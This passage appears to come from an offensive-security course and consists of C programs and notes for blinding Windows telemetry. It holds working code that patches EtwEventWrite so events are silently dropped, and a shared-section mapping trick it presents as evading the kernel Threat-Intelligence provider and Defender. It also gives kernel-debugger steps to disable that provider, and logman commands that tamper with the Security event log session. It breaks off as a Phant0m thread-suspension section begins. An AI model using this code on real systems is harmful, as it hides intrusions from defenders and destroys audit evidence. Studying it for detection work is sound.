    int result = system("logman create trace TestTrace -p {12345678-1234-1234-1234-123456789012} -o test.etl -ets >nul 2>&1");

    if (result == 0) {
        printf("[+] Trace session started successfully\n");
        printf("    Events will be captured to test.etl\n");
    } else {
        printf("[!] Trace session creation failed (likely not admin)\n");
        printf("    Test will continue without trace verification\n");
    }
}

void StopEtwTraceSession() {
    printf("\n[*] Stopping ETW trace session...\n");
    int result = system("logman stop TestTrace -ets >nul 2>&1");
    if (result == 0) {
        printf("[+] Trace session stopped\n");

        // Check if test.etl exists
        FILE* f = fopen("test.etl", "rb");
        if (f) {
            fclose(f);
            printf("\n[+] test.etl file created successfully!\n");
            printf("    To view events:\n");
            printf("      tracerpt test.etl -o test.xml -of XML\n");
            printf("      notepad test.xml\n");
        } else {
            printf("[!] test.etl not found (trace session may not have started)\n");
        }
    }
}

BOOL TestEtwSuppression() {
    printf("\n=== Testing ETW Event Suppression ===\n\n");

    REGHANDLE hProvider = 0;
    ULONG result;

    // Start trace session (requires admin, but won't fail if not admin)
    StartEtwTraceSession();
    Sleep(500);  // Give session time to start

    // Register test provider
    result = EventRegister(&TestProviderGuid, NULL, NULL, &hProvider);
    if (result != ERROR_SUCCESS) {
        printf("[-] EventRegister failed: %lu\n", result);
        return FALSE;
    }

    printf("[+] Test provider registered (handle: 0x%llx)\n", (ULONGLONG)hProvider);

    // Emit test event BEFORE patching
    printf("\n[*] Emitting 5 test events BEFORE patch...\n");
    EVENT_DESCRIPTOR eventDesc = {0};
    eventDesc.Id = 1;
    eventDesc.Level = TRACE_LEVEL_INFORMATION;

    for (int i = 0; i < 5; i++) {
        result = EventWrite(hProvider, &eventDesc, 0, NULL);
        printf("    Event %d: EventWrite returned %lu\n", i+1, result);
        Sleep(100);
    }

    // Now patch ETW
    printf("\n[*] Applying ETW patch...\n");
    PatchEtwEventWrite();

    // Emit test event AFTER patching
    printf("\n[*] Emitting 5 test events AFTER patch...\n");
    for (int i = 0; i < 5; i++) {
        result = EventWrite(hProvider, &eventDesc, 0, NULL);
        printf("    Event %d: EventWrite returned %lu (but NOT written!)\n", i+1, result);
        Sleep(100);
    }

    // Cleanup
    EventUnregister(hProvider);
    StopEtwTraceSession();

    printf("\n[+] Test complete!\n");
    printf("\n");
    printf("VERIFICATION:\n");

    // Check if test.etl exists
    FILE* testFile = fopen("test.etl", "rb");
    if (testFile) {
        fclose(testFile);
        printf("  [+] test.etl file found!\n");
        printf("      To view captured events:\n");
        printf("        tracerpt test.etl -o test.xml -of XML\n");
        printf("        notepad test.xml\n");
        printf("      You should see:\n");
        printf("        - 5 events BEFORE the patch\n");
        printf("        - 0 events AFTER the patch\n");
        printf("      This proves ETW was successfully blinded!\n");
    } else {
        printf("  [!] test.etl not found (trace session requires admin)\n");
        printf("      But the patch still worked! The EventWrite calls\n");
        printf("      returned success but events were silently dropped.\n");
        printf("\n");
        printf("      To verify with admin privileges:\n");
        printf("        1. Run this tool as administrator\n");
        printf("        2. Check test.etl file for proof\n");
    }

    return TRUE;
}

/*
TECHNIQUE: Scan for .NET CLR and patch its ETW
═══════════════════════════════════════════════

Target: Microsoft-Windows-DotNETRuntime provider
Goal:   Hide .NET assembly loads from Defender
*/

// .NET Runtime provider GUID: {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
static const GUID DotNetRuntimeGuid =
    { 0xE13C0D23, 0xCCBC, 0x4E12, { 0x93, 0x1B, 0xD9, 0xCC, 0x2E, 0xEE, 0x27, 0xE4 } };

BOOL FindAndPatchDotNetETW() {
    printf("\n=== Scanning for .NET Runtime ETW ===\n\n");

    // Check if CLR is loaded
    HMODULE hClr = GetModuleHandleA("clr.dll");
    if (!hClr) {
        hClr = GetModuleHandleA("coreclr.dll");
    }
    if (!hClr) {
        hClr = GetModuleHandleA("clrjit.dll");
    }

    if (!hClr) {
        printf("[!] .NET CLR not loaded in this process\n");
        printf("    This is normal if not running .NET code\n");
        printf("    For .NET processes, patch BEFORE loading assemblies\n");
        return FALSE;
    }

    printf("[+] CLR module found @ 0x%p\n", hClr);

    // Get module info
    MODULEINFO modInfo;
    if (GetModuleInformation(GetCurrentProcess(), hClr, &modInfo, sizeof(modInfo))) {
        printf("    Base: 0x%p, Size: %lu bytes\n",
               modInfo.lpBaseOfDll, modInfo.SizeOfImage);
    }

    printf("\n[*] Strategy: Patching EtwEventWrite covers ALL providers\n");
    printf("    including .NET Runtime, PowerShell, and custom providers\n");
    printf("    No need to find specific CLR ETW handles\n");

    return TRUE;
}

/*
TECHNIQUE: Verify patch status
═══════════════════════════════

Check if ETW functions are currently patched.
*/

BOOL VerifyPatchStatus() {
    printf("\n=== Verifying ETW Patch Status ===\n\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    const char* functions[] = {
        "EtwEventWrite",
        "EtwEventWriteEx",
        "EtwEventWriteFull"
    };

    BYTE patchSig[] = { 0x48, 0x33, 0xC0, 0xC3 };  // xor rax,rax; ret

    for (int i = 0; i < 3; i++) {
        FARPROC pFunc = GetProcAddress(hNtdll, functions[i]);
        if (!pFunc) continue;

        BYTE bytes[4];
        memcpy(bytes, pFunc, 4);

        BOOL isPatched = (memcmp(bytes, patchSig, 4) == 0);

        printf("  %-20s @ 0x%p - %s\n",
               functions[i],
               pFunc,
               isPatched ? "[PATCHED]" : "[INTACT]");

        if (!isPatched) {
            printf("    First 4 bytes: %02X %02X %02X %02X\n",
                   bytes[0], bytes[1], bytes[2], bytes[3]);
        }
    }

    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("ETW Provider Patching - Telemetry Blind\n");
    printf("========================================\n");

    printf("\nPRIVILEGE INFO:\n");
    printf("  - Patching ETW: NO admin required (own process memory)\n");
    printf("  - Trace verification: Admin helpful but not required\n\n");

    // Show current status
    VerifyPatchStatus();

    // Test ETW suppression
    TestEtwSuppression();

    // Check for .NET
    FindAndPatchDotNetETW();

    printf("\n========================================\n");
    printf("SUMMARY:\n");
    printf("  ETW patching demonstrated successfully!\n");
    printf("  Check test.etl to verify 5 events before patch, 0 after.\n");
    printf("\n");
    printf("LIMITATIONS:\n");
    printf("  - Only affects usermode ETW in this process\n");
    printf("  - Kernel ETW providers still report activity\n");
    printf("  - Modern EDRs use kernel providers (harder to blind)\n");
    printf("  - Process creation still visible via Kernel-Process provider\n");
    printf("========================================\n");

    return 0;
}
```

```bash
cl src\etw_patch.c /Fe:bin\etw_patch.exe advapi32.lib
# run as admin
.\bin\etw_patch.exe
tracerpt test.etl -summary summary.txt
type summary.txt
tracerpt test.etl -o test.xml -of XML
notepad .\test.xml
```

#### Technique 2: Threat Intelligence ETW Provider

```text
┌─────────────────────────────────────────────────────────────────┐
│     Microsoft-Windows-Threat-Intelligence ETW Provider          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  THE MOST SECURITY-CRITICAL ETW PROVIDER                        │
│                                                                 │
│  GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}                   │
│                                                                 │
│  What it monitors:                                              │
│  ├── NtAllocateVirtualMemory (RWX allocations)                  │
│  ├── NtProtectVirtualMemory  (RW->RX transitions)               │
│  ├── NtMapViewOfSection      (section mapping)                  │
│  ├── NtWriteVirtualMemory    (remote writes)                    │
│  ├── NtQueueApcThread        (APC injection)                    │
│  └── Process/thread creation from kernel                        │
│                                                                 │
│  WHY IT MATTERS:                                                │
│  ├── Fires from KERNEL MODE (can't patch from usermode!)        │
│  ├── Only PPL-protected processes can consume it                │
│  ├── Defender ATP relies on this for memory detection           │
│  ├── CrowdStrike/SentinelOne kernel drivers consume it          │
│  └── Detects shellcode injection, reflective loading, etc       │
│                                                                 │
│  ATTACK DIFFICULTY:                                             │
│  ├── Usermode patch: IMPOSSIBLE (kernel provider)               │
│  ├── Kernel patch:   Requires driver load (BYOVD? PPL bypass?)  │
│  ├── Disable session: Requires SYSTEM + knowledge of session    │
│  └── Avoid triggers:  Use syscalls that don't fire TI events    │
│                                                                 │
│  UPDATE:                                                        │
│  ├── Post-CrowdStrike incident, Microsoft moving EDRs to        │
│  │   usermode with ENHANCED kernel ETW reliance                 │
│  ├── TI ETW provider MORE critical than ever for detection      │
│  ├── Hardware breakpoint abuse now triggers TI events           │
│  └── Kernel access harder (VBS, HVCI more common)               │
│                                                                 │
│  WEEK 7 CONNECTION:                                             │
│  Day 3 (PPL) -> needed to protect TI consumers                  │
│  Day 6 (ETW) -> attacking what those consumers receive          │
│  If you bypassed PPL, you can disable the TI consumer           │
│  If you can't, you must blind the TI provider at kernel level   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```c
// ti_etw_analysis.c - Analyze and demonstrate TI ETW evasion
// Compile: cl src\ti_etw_analysis.c /Fe:bin\ti_etw_analysis.exe advapi32.lib ntdll.lib

#include <windows.h>
#include <evntrace.h>
#include <evntcons.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

/*
THREAT INTELLIGENCE ETW - KERNEL SIDE
══════════════════════════════════════

The TI ETW provider is registered by the kernel itself:
  - nt!EtwThreatIntProvRegHandle stores the registration
  - Events fired inline in kernel memory management functions
  - Example: MiAllocateVirtualMemory -> EtwTiLogAllocExecVm

KERNEL STRUCTURES (via WinDbg):
  dt nt!_ETW_GUID_ENTRY
  dt nt!_ETW_REG_ENTRY
  dt nt!_TRACE_ENABLE_INFO

  The _TRACE_ENABLE_INFO.IsEnabled field controls event delivery.
  If set to 0, the kernel skips the ETW event write.

KERNEL ATTACK:
  1. Find nt!EtwThreatIntProvRegHandle
  2. Walk to _ETW_REG_ENTRY -> _ETW_GUID_ENTRY
  3. Walk _ETW_GUID_ENTRY.EnableInfo[]
  4. Set EnableInfo[x].IsEnabled = 0
  5. TI events stop firing

  This requires a kernel read/write primitive:
  ├── BYOVD driver (Day 4 connection - WDAC may block!)
  ├── PPL bypass + Defender process manipulation
  └── Kernel exploit from Week 11

NOTE: Kernel access is harder than ever:
  - VBS (Virtualization-Based Security) more common
  - HVCI (Hypervisor-Protected Code Integrity) blocks unsigned drivers
  - Microsoft moving EDRs to usermode, but TI ETW stays in kernel
  - Post-CrowdStrike, kernel driver signing more scrutinized
*/

// TI Provider GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
static const GUID ThreatIntelGuid =
    { 0xF4E1897C, 0xBB5D, 0x5668, { 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44 } };

// Ntdll function typedefs
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// Query TI provider registration status
BOOL QueryTIProvider() {
    printf("\n=== Querying Threat Intelligence ETW Provider ===\n\n");

    // Use logman to query the provider
    printf("[*] Checking TI provider registration...\n");
    int result = system("logman query providers \"{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}\" 2>nul");

    if (result == 0) {
        printf("[+] TI provider is registered\n");
    } else {
        printf("[!] Could not query TI provider (may require admin)\n");
    }

    return TRUE;
}

// Enumerate active ETW sessions consuming TI events
BOOL EnumerateTISessions() {
    printf("\n=== Enumerating Sessions Consuming TI Events ===\n\n");

    // Query all active trace sessions
    ULONG bufferSize = 1024 * 1024; // 1MB buffer
    PEVENT_TRACE_PROPERTIES* pSessions = (PEVENT_TRACE_PROPERTIES*)malloc(bufferSize);
    if (!pSessions) {
        printf("[-] Memory allocation failed\n");
        return FALSE;
    }

    ULONG sessionCount = 64; // Max sessions to query
    ULONG status = QueryAllTracesA((PEVENT_TRACE_PROPERTIES*)pSessions, sessionCount, &sessionCount);

    if (status != ERROR_SUCCESS && status != ERROR_MORE_DATA) {
        printf("[-] QueryAllTraces failed: %lu\n", status);
        printf("    (Requires admin privileges)\n");
        free(pSessions);
        return FALSE;
    }

    printf("[+] Found %lu active ETW sessions\n\n", sessionCount);

    // Look for sessions that might consume TI events
    printf("[*] Sessions likely consuming TI events:\n");
    BOOL foundTI = FALSE;

    for (ULONG i = 0; i < sessionCount; i++) {
        PEVENT_TRACE_PROPERTIES pSession = (PEVENT_TRACE_PROPERTIES)((BYTE*)pSessions + (i * sizeof(EVENT_TRACE_PROPERTIES)));

        // Session names are typically at offset after the structure
        char* sessionName = (char*)((BYTE*)pSession + sizeof(EVENT_TRACE_PROPERTIES));

        // Check for Defender, Threat, Sentinel, etc.
        if (sessionName && (
            strstr(sessionName, "Defender") ||
            strstr(sessionName, "Threat") ||
            strstr(sessionName, "Sentinel") ||
            strstr(sessionName, "Security") ||
            strstr(sessionName, "WdFilter"))) {

            printf("    [!] %s\n", sessionName);
            foundTI = TRUE;
        }
    }

    if (!foundTI) {
        printf("    (No obvious TI consumers found - may be hidden/protected)\n");
    }

    free(pSessions);
    return TRUE;
}

void StartTITraceSession() {
    printf("\n[*] Starting TI ETW trace session...\n");
    printf("    (Requires admin)\n");

    // Stop any existing session first
    system("logman stop TITrace -ets >nul 2>&1");

    // Start trace with TI provider - capture ALLOCVM and PROTECTVM events
    int result = system("logman create trace TITrace -p {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} 0xffffffffffffffff 0xff -o ti_trace.etl -ets >nul 2>&1");

    if (result == 0) {
        printf("[+] TI trace session started successfully\n");
        printf("    Events will be captured to ti_trace.etl\n");
        Sleep(500); // Give session time to initialize
    } else {
        printf("[!] Trace session creation failed (requires admin)\n");
        printf("    Test will continue but without trace verification\n");
    }
}

void StopTITraceSession() {
    printf("\n[*] Stopping TI trace session...\n");
    int result = system("logman stop TITrace -ets >nul 2>&1");
    if (result == 0) {
        printf("[+] Trace session stopped\n");

        // Check if ti_trace.etl exists
        FILE* f = fopen("ti_trace.etl", "rb");
        if (f) {
            fclose(f);
            printf("\n[+] ti_trace.etl file created successfully!\n");
            printf("    To view TI events:\n");
            printf("      tracerpt ti_trace.etl -o ti_trace.xml -of XML\n");
            printf("      notepad ti_trace.xml\n");
            printf("\n    Or generate summary:\n");
            printf("      tracerpt ti_trace.etl -summary ti_summary.txt\n");
            printf("      type ti_summary.txt\n");
        } else {
            printf("[!] ti_trace.etl not found\n");
        }
    }
}

// Demonstrate TI-triggering vs TI-evading memory allocation
BOOL DemonstrateEvasion() {
    printf("\n=== Demonstrating TI ETW Evasion ===\n\n");

    // Start TI trace session
    StartTITraceSession();

    // Get ntdll functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
        printf("[-] Failed to resolve ntdll functions\n");
        return FALSE;
    }

    printf("\n[1] BAD: VirtualAlloc with RWX (triggers TI event)\n");
    printf("    This allocation will fire TI ETW event for RWX memory\n");

    LPVOID badAlloc = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (badAlloc) {
        printf("    [+] Allocated RWX memory @ 0x%p\n", badAlloc);
        printf("    [!] SHOULD trigger TI event: KERNEL_THREATINT_TASK_ALLOCVM\n");
        Sleep(200); // Give ETW time to write event
        VirtualFree(badAlloc, 0, MEM_RELEASE);
    }

    printf("\n[2] BETTER: Two-step allocation (still triggers TI)\n");
    printf("    RW allocation -> write code -> change to RX\n");

    LPVOID betterAlloc = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (betterAlloc) {
        printf("    [+] Allocated RW memory @ 0x%p\n", betterAlloc);
        printf("    [*] Writing shellcode...\n");
        memset(betterAlloc, 0xCC, 4096); // int3 instructions

        DWORD oldProtect;
        if (VirtualProtect(betterAlloc, 4096, PAGE_EXECUTE_READ, &oldProtect)) {
            printf("    [+] Changed to RX\n");
            printf("    [!] SHOULD trigger TI event: KERNEL_THREATINT_TASK_PROTECTVM\n");
            Sleep(200); // Give ETW time to write event
        }
        VirtualFree(betterAlloc, 0, MEM_RELEASE);
    }

    printf("\n[3] BEST: Shared section mapping (evades TI)\n");
    printf("    Create section -> map as RW -> map again as RX\n");
    printf("    No VirtualProtect call = no TI event!\n");

    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = 4096;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (status == 0 && hSection) {
        printf("    [+] Created section handle: 0x%p\n", hSection);

        // Map as RW for writing
        PVOID rwView = NULL;
        SIZE_T viewSize = 0;
        status = NtMapViewOfSection(
            hSection,
            GetCurrentProcess(),
            &rwView,
            0, 0, NULL,
            &viewSize,
            1, // ViewShare
            0,
            PAGE_READWRITE
        );

        if (status == 0 && rwView) {
            printf("    [+] Mapped RW view @ 0x%p\n", rwView);
            printf("    [*] Writing shellcode to RW view...\n");
            memset(rwView, 0xCC, 4096);

            // Map again as RX for execution
            PVOID rxView = NULL;
            viewSize = 0;
            status = NtMapViewOfSection(
                hSection,
                GetCurrentProcess(),
                &rxView,
                0, 0, NULL,
                &viewSize,
                1, // ViewShare
                0,
                PAGE_EXECUTE_READ
            );

            if (status == 0 && rxView) {
                printf("    [+] Mapped RX view @ 0x%p\n", rxView);
                printf("    [+] SUCCESS: Code is executable without VirtualProtect!\n");
                printf("    [+] SHOULD NOT trigger TI event (no VirtualProtect/VirtualAlloc RWX)\n");
                Sleep(200); // Give ETW time (but no event should fire)

                printf("\n    EVASION PROOF:\n");
                printf("      - Section created with SEC_COMMIT (not suspicious)\n");
                printf("      - Mapped twice with different protections\n");
                printf("      - No VirtualProtect call = no EtwTiLogProtectExecVm\n");
                printf("      - Shellcode visible in RX view, writable in RW view\n");

                NtUnmapViewOfSection(GetCurrentProcess(), rxView);
            }

            NtUnmapViewOfSection(GetCurrentProcess(), rwView);
        }

        CloseHandle(hSection);
    } else {
        printf("    [-] NtCreateSection failed: 0x%08X\n", status);
    }

    // Stop trace and show verification steps
    StopTITraceSession();

    printf("\n");
    printf("VERIFICATION:\n");
    printf("  Check ti_trace.etl to see which operations triggered TI events:\n");
    printf("    tracerpt ti_trace.etl -summary ti_summary.txt\n");
    printf("    type ti_summary.txt\n");
    printf("\n");
    printf("  IMPORTANT LIMITATION:\n");
    printf("    TI ETW events are ONLY delivered to PPL-protected consumers!\n");
    printf("    Our trace session is NOT PPL-protected, so we won't see TI events.\n");
    printf("    This is by design - TI events contain sensitive security data.\n");
    printf("\n");
    printf("  Real TI consumers (that CAN see these events):\n");
    printf("    - Windows Defender (MpWppTracing sessions)\n");
    printf("    - EDR kernel drivers with PPL protection\n");
    printf("    - Security products with kernel-mode components\n");
    printf("\n");
    printf("  Alternative verification methods:\n");
    printf("    1. Check Defender logs for memory allocation detections\n");
    printf("    2. Use Process Monitor to see VirtualAlloc/VirtualProtect calls\n");
    printf("    3. Use kernel debugger to trace nt!EtwTiLogAllocExecVm calls\n");
    printf("    4. EDR products will alert on RWX allocations (test #1 and #2)\n");
    printf("       but NOT on shared section mapping (test #3)\n");
    printf("\n");
    printf("  The key point: Shared section mapping avoids the kernel functions\n");
    printf("  that trigger TI events (NtAllocateVirtualMemory RWX, NtProtectVirtualMemory)\n");

    return TRUE;
}

// Show kernel attack path (requires kernel access)
void ShowKernelAttackPath() {
    printf("\n=== Kernel-Level TI ETW Disabling ===\n\n");

    printf("REQUIREMENTS:\n");
    printf("  - Kernel read/write primitive (BYOVD, exploit, etc.)\n");
    printf("  - Knowledge of kernel structures\n\n");

    printf("ATTACK STEPS (WinDbg commands):\n\n");

    printf("1. Find TI provider registration handle:\n");
    printf("   kd> dq nt!EtwThreatIntProvRegHandle L1\n");
    printf("   fffff800`12345678  fffffa80`aabbccdd\n\n");

    printf("2. Dump the registration entry:\n");
    printf("   kd> dt nt!_ETW_REG_ENTRY fffffa80`aabbccdd\n");
    printf("      +0x000 GuidEntry        : 0xfffffa80`11223344\n");
    printf("      +0x008 Callback         : 0xfffff800`deadbeef\n");
    printf("      ...\n\n");

    printf("3. Dump the GUID entry:\n");
    printf("   kd> dt nt!_ETW_GUID_ENTRY 0xfffffa80`11223344\n");
    printf("      +0x000 ListEntry        : _LIST_ENTRY\n");
    printf("      +0x010 RefCount         : 0x5\n");
    printf("      +0x018 Guid             : _GUID {f4e1897c-...}\n");
    printf("      +0x028 EnableInfo       : 0xfffffa80`55667788\n");
    printf("      ...\n\n");

    printf("4. Dump the enable info:\n");
    printf("   kd> dt nt!_TRACE_ENABLE_INFO 0xfffffa80`55667788\n");
    printf("      +0x000 IsEnabled        : 0x1  <- TARGET THIS\n");
    printf("      +0x004 Level            : 0x5\n");
    printf("      +0x008 MatchAnyKeyword  : 0xffffffff`ffffffff\n");
    printf("      ...\n\n");

    printf("5. Disable TI events (kernel write):\n");
    printf("   kd> eb 0xfffffa80`55667788 0\n");
    printf("   [+] TI ETW provider disabled!\n\n");

    printf("VERIFICATION:\n");
    printf("  - Allocate RWX memory -> no TI event fires\n");
    printf("  - Defender/EDR loses visibility into memory operations\n");
    printf("  - Process injection becomes undetected\n\n");
}

int main() {
    printf("===========================================\n");
    printf("Threat Intelligence ETW - Attack Analysis\n");
    printf("===========================================\n");

    // Query TI provider
    QueryTIProvider();

    // Enumerate sessions (requires admin)
    EnumerateTISessions();

    // Demonstrate evasion techniques
    DemonstrateEvasion();

    // Show kernel attack path
    ShowKernelAttackPath();

    printf("\n===========================================\n");
    printf("SUMMARY:\n");
    printf("  [+] TI ETW provider analyzed\n");
    printf("  [+] Evasion technique demonstrated\n");
    printf("  [+] Shared section mapping avoids TI events\n");
    printf("  [!] Kernel-level disabling requires exploit\n");
    printf("\n");
    printf("WHY NO TI EVENTS IN TRACE:\n");
    printf("  TI events are ONLY delivered to PPL-protected consumers.\n");
    printf("  Our usermode trace session cannot receive them (by design).\n");
    printf("  Real consumers: Defender (MpWppTracing), EDR kernel drivers.\n");
    printf("\n");
    printf("PROOF OF EVASION:\n");
    printf("  - VirtualAlloc RWX calls nt!MiAllocateVirtualMemory\n");
    printf("    -> Triggers nt!EtwTiLogAllocExecVm (Defender sees this)\n");
    printf("  - VirtualProtect RW->RX calls nt!MiProtectVirtualMemory\n");
    printf("    -> Triggers nt!EtwTiLogProtectExecVm (Defender sees this)\n");
    printf("  - NtMapViewOfSection does NOT call these functions\n");
    printf("    -> NO TI event fired (Defender blind to this technique)\n");
    printf("\n");
    printf("REAL-WORLD VALIDATION:\n");
    printf("  Run this tool with Defender enabled:\n");
    printf("    - Tests #1 and #2 may trigger Defender alerts\n");
    printf("    - Test #3 (shared section) will NOT trigger alerts\n");
    printf("  This is the practical proof of TI ETW evasion.\n");
    printf("===========================================\n");

    return 0;
}
```

#### Technique 3: Event Log Tampering

```c
// etw_session_tamper.c - ETW session manipulation and event log tampering
// Compile: cl src\etw_session_tamper.c /Fe:bin\etw_session_tamper.exe advapi32.lib

#include <windows.h>
#include <evntrace.h>
#include <evntcons.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

/*
EVENT LOG TAMPERING - THE PROBLEM
══════════════════════════════════

Traditional approaches are NOISY:
  - wevtutil cl Security -> Generates Event ID 1102 (audit log cleared)
  - net stop EventLog -> Generates service stop event
  - Deleting .evtx files -> Generates file access events

BETTER APPROACHES:
  1. ETW session manipulation (disable providers feeding event logs)
  2. Thread suspension (Phant0m technique - suspend EventLog threads)
  3. Session buffer manipulation (cause event loss without stopping)

This tool demonstrates ETW session manipulation.
*/

// Security Auditing provider GUID: {54849625-5478-4994-A5BA-3E3B0328C30D}
static const GUID SecurityAuditingGuid =
    { 0x54849625, 0x5478, 0x4994, { 0xA5, 0xBA, 0x3E, 0x3B, 0x03, 0x28, 0xC3, 0x0D } };

// List all active ETW sessions
BOOL EnumerateETWSessions() {
    printf("\n=== Enumerating Active ETW Sessions ===\n\n");

    // Use logman to enumerate sessions
    printf("[*] Querying active ETW sessions...\n");
    int result = system("logman query -ets > etw_sessions.txt 2>&1");

    if (result == 0) {
        printf("[+] Sessions enumerated successfully\n\n");

        // Read and display the output
        FILE* f = fopen("etw_sessions.txt", "r");
        if (f) {
            char line[512];
            int sessionCount = 0;
            BOOL inSessionList = FALSE;

            printf("Active ETW Sessions:\n");
            printf("%-40s %-20s %-10s\n", "Session Name", "Type", "Status");
            printf("--------------------------------------------------------------------------------\n");

            while (fgets(line, sizeof(line), f)) {
                // Look for session entries
                if (strstr(line, "Trace") && strstr(line, "Running")) {
                    printf("%s", line);
                    sessionCount++;
                }
            }

            fclose(f);
            printf("\n[+] Found %d active sessions\n", sessionCount);

            // Identify event log sessions
            printf("\n[*] Event Log ETW Sessions (targets for tampering):\n");
            f = fopen("etw_sessions.txt", "r");
            if (f) {
                while (fgets(line, sizeof(line), f)) {
                    if (strstr(line, "EventLog") || strstr(line, "Eventlog")) {
                        printf("    [!] %s", line);
                    }
                }
                fclose(f);
            }
        }

        DeleteFileA("etw_sessions.txt");
    } else {
        printf("[-] Failed to enumerate sessions (requires admin)\n");
        return FALSE;
    }

    return TRUE;
}

// Demonstrate ETW session manipulation
BOOL DemonstrateSessionTampering() {
    printf("\n=== Demonstrating ETW Session Tampering ===\n\n");

    printf("[*] Target: EventLog-Security session\n");
    printf("    This session feeds events to the Security event log\n\n");

    // Check current session properties
    printf("[1] Query current session properties:\n");
    system("logman query \"EventLog-Security\" -ets 2>nul");

    printf("\n[2] Demonstrate session manipulation techniques:\n\n");

    // Technique 1: Reduce buffer size to cause event loss
    printf("    [A] Reduce buffer size (causes event drops under load)\n");
    printf("        Command: logman update \"EventLog-Security\" -bs 1 -ets\n");
    printf("        Effect: 1KB buffer = events dropped when system is busy\n");
    printf("        Stealth: No obvious tampering, just \"performance issues\"\n\n");

    // Technique 2: Increase flush timer
    printf("    [B] Increase flush timer (delays event writing)\n");
    printf("        Command: logman update \"EventLog-Security\" -ft 999 -ets\n");
    printf("        Effect: Events sit in memory for 999 seconds\n");
    printf("        Stealth: Execute malicious activity and clean up before flush\n\n");

    // Technique 3: Disable specific provider
    printf("    [C] Disable Security Auditing provider\n");
    printf("        Command: logman update \"EventLog-Security\" -p \"{54849625-5478-4994-A5BA-3E3B0328C30D}\" 0x0 -ets\n");
    printf("        Effect: Security events stop flowing to Security log\n");
    printf("        Stealth: Moderate - security team may notice gap in logs\n\n");

    // Technique 4: Stop session entirely
    printf("    [D] Stop session entirely (NOISY)\n");
    printf("        Command: logman stop \"EventLog-Security\" -ets\n");
    printf("        Effect: All events to Security log stop\n");
    printf("        Stealth: LOW - obvious tampering, generates alerts\n\n");

    printf("[*] Testing buffer size manipulation (safest technique)...\n");

    // Get original buffer size
    FILE* f = _popen("logman query \"EventLog-Security\" -ets 2>nul | findstr \"Buffer\"", "r");
    char originalBuffer[256] = {0};
    if (f) {
        fgets(originalBuffer, sizeof(originalBuffer), f);
        _pclose(f);
        printf("    Original buffer config: %s", originalBuffer);
    }

    // Reduce buffer size (this is the safest tampering technique)
    printf("\n    [*] Attempting to reduce buffer size to 4KB...\n");
    int result = system("logman update \"EventLog-Security\" -bs 4 -ets 2>&1");

    if (result == 0) {
        printf("    [+] Buffer size reduced successfully!\n");
        printf("    [+] Events will now be dropped under moderate load\n");

        // Verify the change
        f = _popen("logman query \"EventLog-Security\" -ets 2>nul | findstr \"Buffer Size\"", "r");
        if (f) {
            char newBuffer[256] = {0};
            fgets(newBuffer, sizeof(newBuffer), f);
            _pclose(f);
            printf("    [+] New buffer config: %s", newBuffer);
        }

        Sleep(2000);

        // Restore original buffer size
        printf("\n    [*] Restoring original buffer size...\n");
        system("logman update \"EventLog-Security\" -bs 64 -ets >nul 2>&1");
        printf("    [+] Buffer size restored\n");
    } else {
        printf("    [-] Buffer size modification failed\n");
        printf("    [!] EventLog-Security session may be protected\n\n");

        // Try with a less protected session as demonstration
        printf("    [*] Trying with EventLog-Application instead...\n");
        result = system("logman update \"EventLog-Application\" -bs 4 -ets 2>&1");

        if (result == 0) {
            printf("    [+] EventLog-Application buffer reduced successfully!\n");
            printf("    [+] This demonstrates the technique works\n");

            Sleep(1000);

            // Restore
            printf("    [*] Restoring EventLog-Application buffer...\n");
            system("logman update \"EventLog-Application\" -bs 64 -ets >nul 2>&1");
            printf("    [+] Restored\n");
        } else {
            printf("    [-] Session modification requires elevated privileges\n");
            printf("    [!] Some sessions have additional protections\n");
        }
    }

    return TRUE;
}

// Demonstrate Phant0m technique (thread suspension) - ACTUALLY IMPLEMENT IT
BOOL DemonstratePhant0mTechnique() {
    printf("\n=== Phant0m Technique: EventLog Thread Suspension ===\n\n");

    printf("CONCEPT:\n");
    printf("  The EventLog service runs inside svchost.exe\n");
